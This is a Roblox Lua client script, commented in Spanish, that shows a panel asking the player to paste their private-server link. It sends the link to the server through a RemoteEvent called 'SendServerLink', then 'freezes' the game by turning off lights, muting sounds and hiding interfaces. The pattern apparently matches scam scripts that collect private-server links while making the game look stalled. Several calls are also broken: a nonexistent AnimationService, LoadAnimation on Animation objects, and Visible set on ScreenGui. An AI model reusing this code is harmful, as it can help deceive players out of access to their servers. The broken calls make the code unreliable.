local Player = game.Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Creamos la UI para el usuario
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextBox = Instance.new("TextBox")
local Button = Instance.new("TextButton")
local Label = Instance.new("TextLabel")

-- Parent al PlayerGui
ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.DisplayOrder = 100 -- asegura que esté encima de otras GUIs

-- Configuración del Frame
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 300, 0, 200)
Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
Frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
Frame.BorderSizePixel = 0
Frame.ZIndex = 10

-- Configuración del Label
Label.Parent = Frame
Label.Size = UDim2.new(1, -20, 0, 30)
Label.Position = UDim2.new(0, 10, 0, 10)
Label.Text = "Ingresa el link de tu servidor privado:"
Label.TextColor3 = Color3.new(1, 1, 1)
Label.BackgroundTransparency = 1
Label.ZIndex = 11

-- Configuración del TextBox
TextBox.Parent = Frame
TextBox.Size = UDim2.new(1, -20, 0, 40)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.TextColor3 = Color3.new(1, 1, 1)
TextBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
TextBox.ClearTextOnFocus = false
TextBox.Text = "https://www.roblox.com/games/"
TextBox.ZIndex = 12

-- Configuración del Button
Button.Parent = Frame
Button.Size = UDim2.new(1, -20, 0, 40)
Button.Position = UDim2.new(0, 10, 0, 100)
Button.Text = "Enviar"
Button.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
Button.TextColor3 = Color3.new(1, 1, 1)
Button.ZIndex = 13

-- Función para validar el link
local function isValidLink(link)
    if string.find(link, "https://www.roblox.com/games/") then
        return true
    else
        return false
    end
end

-- Función para "congelar" el entorno
local function freezeEnvironment()
    for _, light in pairs(game:GetService("Workspace"):GetChildren()) do
        if light:IsA("Light") then
            light.Enabled = false
        end
    end

    for _, sound in pairs(game:GetService("SoundService"):GetChildren()) do
        sound:Stop()
        sound.Volume = 0
    end

    local animationService = game:GetService("AnimationService")
    local animations = animationService:GetChildren()
    for _, anim in pairs(animations) do
        if anim:IsA("Animation") then
            anim:LoadAnimation()
            anim:Stop()
        end
    end

    for _, effect in pairs(game:GetService("StarterGui"):GetChildren()) do
        if effect:IsA("ScreenGui") then
            effect.Visible = false
        end
    end
end

-- Evento del botón
Button.MouseButton1Click:Connect(function()
    local link = TextBox.Text
    if isValidLink(link) then
        local remoteEvent = ReplicatedStorage:WaitForChild("SendServerLink")
        remoteEvent:FireServer(link)
        freezeEnvironment()
    else
        print("El link no es válido")
    end
end)
